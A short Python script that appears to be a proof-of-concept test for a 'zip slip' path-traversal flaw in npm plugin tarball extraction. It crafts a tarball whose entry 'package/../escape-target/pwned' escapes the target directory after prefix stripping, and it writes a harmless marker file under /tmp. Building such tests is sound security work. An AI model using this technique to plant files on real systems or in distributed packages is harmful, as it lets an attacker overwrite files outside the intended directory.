import tarfile, io, os

# Simulate a malicious npm tarball. npm tarballs have top-level directory 'package/'.
# With --strip-components=1, 'package/X' becomes 'X' relative to -C dir.
# With --strip-components=1, 'package/../../../../../../../tmp/zipslip-test/escape-target/pwned' 
#   after stripping 'package/' becomes '../../../../../../../tmp/zipslip-test/escape-target/pwned'

out_path = "/tmp/zipslip-test/evil.tgz"
target_dir = "/tmp/zipslip-test/target"  # This is pluginDir analog
# We want to escape target_dir and write to /tmp/zipslip-test/escape-target/pwned

# Compute relative traversal from target_dir to /tmp/zipslip-test/escape-target
# target_dir = /tmp/zipslip-test/target -> parent is /tmp/zipslip-test, cousin is escape-target
# So relative path is ../escape-target/pwned
# But we need one more .. because strip-components strips one level from the entry prefix

# Entry name we add: "package/../escape-target/pwned"
# After --strip-components=1: "../escape-target/pwned"
# Resolved relative to target_dir: /tmp/zipslip-test/target/../escape-target/pwned = /tmp/zipslip-test/escape-target/pwned

with tarfile.open(out_path, "w:gz") as tar:
    # Add the package.json so webSearchPluginUpToDate cache is properly updated
    pkg_info = tarfile.TarInfo("package/package.json")
    pkg_content = b'{"version":"0.2.1","name":"evil"}'
    pkg_info.size = len(pkg_content)
    tar.addfile(pkg_info, io.BytesIO(pkg_content))
    
    # Malicious entry using raw path traversal
    evil = tarfile.TarInfo("package/../escape-target/pwned")
    evil_content = b"ZIPSLIP_PWNED_PROOF_OF_CONCEPT\n"
    evil.size = len(evil_content)
    tar.addfile(evil, io.BytesIO(evil_content))

print("Created:", out_path)
